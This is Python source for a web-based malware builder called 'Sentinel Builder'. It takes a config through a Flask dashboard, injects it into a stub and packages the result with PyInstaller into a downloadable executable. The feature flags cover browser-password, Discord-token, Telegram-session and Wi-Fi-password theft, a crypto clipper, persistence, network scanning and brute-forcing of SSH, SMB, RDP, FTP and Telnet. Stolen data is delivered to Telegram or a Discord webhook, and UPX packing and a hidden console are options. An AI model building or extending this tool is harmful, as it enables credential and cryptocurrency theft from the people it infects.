#!/usr/bin/env python3
"""
Builder v1.2 - using stub.txt as template
Serves dashboard, accepts config, builds custom executable.

1. Accept config (or use current)
2. Create a unique build directory
3. Copy modules folder
4. Generate loader.py with embedded config
5. Run PyInstaller
6. Move exe to static/ and return download URL

"""

import os
import sys
import json
import shutil
import subprocess
import re
from datetime import datetime
from flask import Flask, request, jsonify, send_file, render_template_string

# ==================== Configuration ====================
DEFAULT_CONFIG = {
    "version": "1.0.0",
    "last_updated": datetime.now().isoformat(),
    "pyinstaller_settings": {
        "onefile": False,
        "noconsole": False,
        "clean": False,
        "upx": False,
        "debug": False
    },
    "delivery": {
        "telegram_token": "",
        "telegram_chat_id": "",
        "discord_webhook": ""
    },
    "features": {
        "system_info": False,
        "screenshot": False,
        "browser_passwords": False,
        "discord_token": False,
        "telegram_session": False,
        "network_scan": False,
        "wifi_passwords": False,
        "crypto_clipper": False,
        "persistence": False,
        "auto_brute": False
    },
    "network_settings": {
        "threads": 50,
        "timeout": 1.0,
        "ports": [21, 22, 23, 445, 3389]
    },
    "crypto_addresses": {
        "Bitcoin": "",
        "Ethereum": "",
        "Litecoin": "",
        "Monero": "",
        "Dogecoin": ""
    },
    "browsers": ["Chrome", "Edge", "Firefox", "Brave", "Opera", "Opera GX", "Vivaldi", "Yandex"],
    "brute_services": {
        "ftp": False,
        "ssh": False,
        "telnet": False,
        "smb": False,
        "rdp": False
    }
}

# ==================== Flask App ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'sentinel-builder-secret'

# Current configuration (in memory)
current_config = DEFAULT_CONFIG.copy()

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DASHBOARD_HTML = os.path.join(BASE_DIR, 'templates/dashboard.html')
STUB_TXT = os.path.join(BASE_DIR, 'stub.txt')
MODULES_DIR = os.path.join(BASE_DIR, 'modules')
UPX_DIR = os.path.join(BASE_DIR, 'upx')
BUILDS_DIR = os.path.join(BASE_DIR, 'builds')
STATIC_DIR = os.path.join(BASE_DIR, 'File_Generated')

# Ensure directories exist
os.makedirs(BUILDS_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

# ==================== Helper Functions ====================
def load_dashboard_html():
    """Read dashboard.html and return as string."""
    try:
        with open(DASHBOARD_HTML, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        return f"<h1>Error loading dashboard: {e}</h1>"

def config_to_python(config):
    """
    Convert config dict to a Python code string with proper True/False/None.
    Uses json.dumps for formatting, then replaces JSON booleans/null.
    """
    json_str = json.dumps(config, indent=4)
    # Replace JSON booleans/null with Python literals
    json_str = re.sub(r': true\b', ': True', json_str)
    json_str = re.sub(r': false\b', ': False', json_str)
    json_str = re.sub(r': null\b', ': None', json_str)
    return json_str

def replace_config_in_stub(stub_content, new_config):
    """
    Replace the CONFIG dictionary in stub.txt with new_config.
    Uses brace counting to find the exact block.
    Returns modified content with proper indentation.
    """
    lines = stub_content.splitlines()
    # Find the line containing 'CONFIG ='
    start_idx = None
    for i, line in enumerate(lines):
        if line.strip().startswith('CONFIG ='):
            start_idx = i
            break
    if start_idx is None:
        raise ValueError("Could not find 'CONFIG =' in stub.txt")

    # Count braces to find end of dict
    brace_count = 0
    end_idx = start_idx
    in_dict = False
    for i in range(start_idx, len(lines)):
        line = lines[i]
        for char in line:
            if char == '{':
                brace_count += 1
                in_dict = True
            elif char == '}':
                brace_count -= 1
                if brace_count == 0 and in_dict:
                    end_idx = i
                    break
        if brace_count == 0 and in_dict:
            break
    else:
        raise ValueError("Could not find end of CONFIG dictionary")

    # Extract base indentation of the 'CONFIG =' line
    indent_match = re.match(r'^(\s*)', lines[start_idx])
    base_indent = indent_match.group(1) if indent_match else ''

    # Generate new config as a properly indented block
    config_str = config_to_python(new_config)
    config_lines = config_str.splitlines()

    # First line is '{', last line is '}'
    body_lines = config_lines[1:-1]  # everything between the braces
    new_block = [f"{base_indent}CONFIG = {{"]
    for line in body_lines:
        # Each inner line already has 4 spaces from json.dumps
        new_block.append(f"{base_indent}{line}")
    new_block.append(f"{base_indent}}}")

    # Replace the old block with new_block
    new_lines = lines[:start_idx] + new_block + lines[end_idx+1:]
    return '\n'.join(new_lines)

# def run_pyinstaller(build_dir, loader_path, settings):
#     """
#     Run PyInstaller with the given settings inside build_dir.
#     Returns path to the generated executable (or None on failure).
#     """
#     cmd = ['pyinstaller', '--distpath', '.', '--workpath', 'build', '--specpath', '.']

#     if settings.get('onefile'):
#         cmd.append('--onefile')
#     if settings.get('noconsole'):
#         cmd.append('--noconsole')
#     if settings.get('clean'):
#         cmd.append('--clean')

#     # Add data files (modules folder)
#     sep = ';' if sys.platform == 'win32' else ':'
#     modules_src = os.path.join(build_dir, 'modules')
#     cmd.extend(['--add-data', f'modules{sep}modules'])

   

#     # UPX support PyInstaller uses --upx-dir for the directory containing upx binary (Fixed)
#     if settings.get('upx'):
#         upx_exe = os.path.join(UPX_DIR, 'upx.exe') if sys.platform == 'win32' else os.path.join(UPX_DIR, 'upx')
#         if os.path.exists(upx_exe):

#             abs_upx_dir = os.path.abspath(UPX_DIR)
#             print(f"[BUILDER] UPX enabled: {upx_exe}")
#             cmd.extend(['--upx-dir', abs_upx_dir])
#         else:
#             print(f"[BUILDER] UPX enabled but not found at: {upx_exe}")

#     cmd.append(loader_path)

#     print(f"[BUILDER] Running: {' '.join(cmd)}")
#     result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)

#     if result.returncode != 0:
#         print(f"[BUILDER] PyInstaller error:\n{result.stderr}")
#         return None

#     # Find the generated executable
#     for f in os.listdir(build_dir):
#         if f.endswith('.exe') or (not sys.platform == 'win32' and os.access(os.path.join(build_dir, f), os.X_OK)):
#             return os.path.join(build_dir, f)
#     return None
def run_pyinstaller(build_dir, loader_path, settings):
    """
    Run PyInstaller with the given settings inside build_dir.
    Returns path to the generated executable (or None on failure).
    """
    # cmd = ['pyinstaller', '--distpath', '.', '--workpath', 'build', '--specpath', '.']
    cmd = ['pyinstaller', '--distpath', 'dist', '--workpath', 'build', '--specpath', '.']
    if settings.get('onefile'):
        cmd.append('--onefile')
    if settings.get('noconsole'):
        cmd.append('--noconsole')
    if settings.get('clean'):
        cmd.append('--clean')

    # Add data files (modules folder) - FIXED: use modules_src variable
    sep = ';' if sys.platform == 'win32' else ':'
    modules_src = os.path.join(build_dir, 'modules')
    
    # Only add if modules folder exists
    if os.path.exists(modules_src):
        cmd.extend(['--add-data', f'{modules_src}{sep}modules'])
        print(f"[BUILDER] Adding modules: {modules_src}")
    else:
        print(f"[BUILDER] No modules folder found at: {modules_src}")

 
    hidden_imports = [
        # SSH dependencies
        'paramiko',
        'paramiko.transport',
        'paramiko.auth_handler',
        'paramiko.ssh_exception',
        'paramiko.client',
        'paramiko.rsakey',
        'paramiko.ed25519key',
        'paramiko.ecdsakey',
        'paramiko.hostkeys',
        'paramiko.kex_group1',
        'paramiko.kex_group14',
        'paramiko.kex_gex',
        'paramiko.kex_curve25519',
        'paramiko.kex_ecdh_nist',
        'paramiko.compress',
        'paramiko.channel',
        'paramiko.packet',
        'paramiko.dsskey',
        'paramiko.pkey',
        'paramiko.message',
        'paramiko.sftp_client', 
        'paramiko.sftp',
        'paramiko.ber',
        # Cryptography (required by paramiko) - CRITICAL
        'cryptography',
        'cryptography.hazmat',
        'cryptography.hazmat.backends',
        'cryptography.hazmat.backends.openssl',
        'cryptography.hazmat.primitives',
        'cryptography.hazmat.primitives.ciphers',
        'cryptography.hazmat.primitives.asymmetric',
        'cryptography.hazmat.primitives.asymmetric.rsa',
        'cryptography.hazmat.primitives.asymmetric.ec',
        'cryptography.hazmat.primitives.asymmetric.ed25519',
        'cryptography.hazmat.primitives.asymmetric.dsa',
        'cryptography.hazmat.primitives.hashes',
        'cryptography.hazmat.primitives.serialization',
        'cryptography.hazmat.primitives.kdf',
        'cryptography.hazmat.primitives.constant_time',
        'cryptography.hazmat.primitives.padding',
        'cryptography.hazmat.primitives.hmac',
        'cryptography.hazmat.bindings',
        'cryptography.hazmat.bindings._openssl',  # CRITICAL: C extension
        'cryptography.hazmat.bindings.openssl',
        'cryptography.exceptions',
        'cryptography.utils',
        'cryptography.x509',
        '_cffi_backend',  # CRITICAL for cryptography
        # Additional crypto deps
        'bcrypt',
        'bcrypt._bcrypt',
        'nacl',
        'nacl.bindings',
        'nacl.bindings.crypto_box',
        'nacl.bindings.crypto_sign',
        'nacl.exceptions',
        # SMB protocol
        'smbprotocol',
        'smbprotocol.connection',
        'smbprotocol.session',
        'smbprotocol.tree',
        'smbprotocol.open',
        'smbprotocol.transport',
        'smbprotocol.exceptions',
        # Windows WMI (if available)
        'wmi',
        'win32com',
        'win32com.client',
        'ftplib',
        'socket',
        'threading',
        'ipaddress',
        'json',
        'subprocess',
        'uuid',
        'struct',
        'hashlib',
        'hmac',
        'time',
        'os',
        'datetime',
        'typing',
        'base64',
        'tempfile',
        'shutil',
        'zipfile',
        'psutil',
        'ctypes',
        'ctypes.wintypes',
    ]

    # CRITICAL: Add cryptography DLLs for paramiko to work in PyInstaller
    # Required for the cryptography package in C extensions
    # https://pyinstaller.org/en/v3.3.1/hooks.html
    from PyInstaller.utils.hooks import collect_dynamic_libs
    try:
        crypto_binaries = collect_dynamic_libs('cryptography')
        if crypto_binaries:
            for src, dst in crypto_binaries:
                cmd.extend(['--add-binary', f'{src}{sep}{dst}'])
                print(f"[BUILDER] Adding crypto binary: {src}")
    except Exception as e:
        print(f"[BUILDER] Warning: Could not collect crypto binaries: {e}")
    
    for imp in hidden_imports:
        cmd.extend(['--hidden-import', imp])

    # UPX support - Fixed path handling
    if settings.get('upx'):
        upx_exe = os.path.join(UPX_DIR, 'upx.exe') if sys.platform == 'win32' else os.path.join(UPX_DIR, 'upx')
        if os.path.exists(upx_exe):
            abs_upx_dir = os.path.abspath(UPX_DIR)
            print(f"[BUILDER] UPX enabled: {upx_exe}")
            cmd.extend(['--upx-dir', abs_upx_dir])
        else:
            print(f"[BUILDER] UPX enabled but not found at: {upx_exe}")

    cmd.append(loader_path)

    print(f"[BUILDER] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"[BUILDER] PyInstaller error:\n{result.stderr}")
        return None

    # Find the generated executable - Improved detection
    exe_name = os.path.splitext(os.path.basename(loader_path))[0]
    if sys.platform == 'win32':
        exe_name += '.exe'
            
    # Check dist folder first (PyInstaller default output location)
    dist_exe = os.path.join(build_dir, 'dist', exe_name)  # ← WRONG PATH
    if os.path.exists(dist_exe):
        # Move to build_dir if needed
        final_exe = os.path.join(build_dir, exe_name)
        if dist_exe != final_exe:
            import shutil
            shutil.move(dist_exe, final_exe)  # ← FIRST MOVE
        return final_exe
    
    # Fallback: search in build_dir
    for f in os.listdir(build_dir):
        if f == exe_name:
            return os.path.join(build_dir, f)  # ← RETURNS SAME FILE AGAIN
    
    return None

# ==================== Routes ====================
@app.route('/')
def index():
    return render_template_string(load_dashboard_html())

@app.route('/api/config', methods=['GET'])
def get_config():
    return jsonify(current_config)

@app.route('/api/save', methods=['POST'])
def save_config():
    global current_config
    data = request.get_json()
    if data:
        # Deep merge to preserve structure
        def deep_merge(a, b):
            for key in b:
                if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
                    deep_merge(a[key], b[key])
                else:
                    a[key] = b[key]
            return a
        current_config = deep_merge(current_config, data)
        current_config['last_updated'] = datetime.now().isoformat()
        return jsonify({'success': True, 'message': 'Config saved'})
    return jsonify({'success': False, 'message': 'No data'}), 400

@app.route('/api/build', methods=['POST'])
def build():
    data = request.get_json()
    if data:
        # Update config with received data
        global current_config
        def deep_merge(a, b):
            for key in b:
                if key in a and isinstance(a[key], dict) and isinstance(b[key], dict):
                    deep_merge(a[key], b[key])
                else:
                    a[key] = b[key]
            return a
        current_config = deep_merge(current_config, data)

    # Create unique build folder
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    build_dir = os.path.join(BUILDS_DIR, f'build_{timestamp}')
    os.makedirs(build_dir, exist_ok=True)

    try:
        # 1. Copy modules folder
        dest_modules = os.path.join(build_dir, 'modules')
        shutil.copytree(MODULES_DIR, dest_modules)

        # 2. Read stub.txt and inject config
        with open(STUB_TXT, 'r', encoding='utf-8') as f:
            stub_content = f.read()
        loader_content = replace_config_in_stub(stub_content, current_config)

        loader_path = os.path.join(build_dir, 'loader.py')
        with open(loader_path, 'w', encoding='utf-8') as f:
            f.write(loader_content)

        # 3. Run PyInstaller
        exe_path = run_pyinstaller(build_dir, loader_path, current_config['pyinstaller_settings'])
        if not exe_path:
            return jsonify({'success': False, 'message': 'Build failed, check console'}), 500

        # 4. Move exe to static folder with a nice name
        exe_name = f"Cliented_{timestamp}.exe" if sys.platform == 'win32' else f"Cliented_{timestamp}"
        final_exe = os.path.join(STATIC_DIR, exe_name)
        
        # Remove if exists to prevent duplicates
        if os.path.exists(final_exe):
            os.remove(final_exe)
            
        shutil.move(exe_path, final_exe)

        # Return download URL
        download_url = f'/File_Generated/{exe_name}'
        return jsonify({'success': True, 'download_url': download_url})

    except Exception as e:
        print(f"[BUILDER] Build error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'message': str(e)}), 500

# Serve static files for exe
@app.route('/File_Generated/<path:filename>')
def serve_static(filename):
    return send_file(os.path.join(STATIC_DIR, filename), as_attachment=True)

# ==================== Main ====================
if __name__ == '__main__':
    print("=" * 60)
    print("Sentinel Builder - Starting web interface")
    print("Open http://127.0.0.1:5000 in your browser")
    print("=" * 60)
    app.run(debug=True, host='0.0.0.0', port=5000)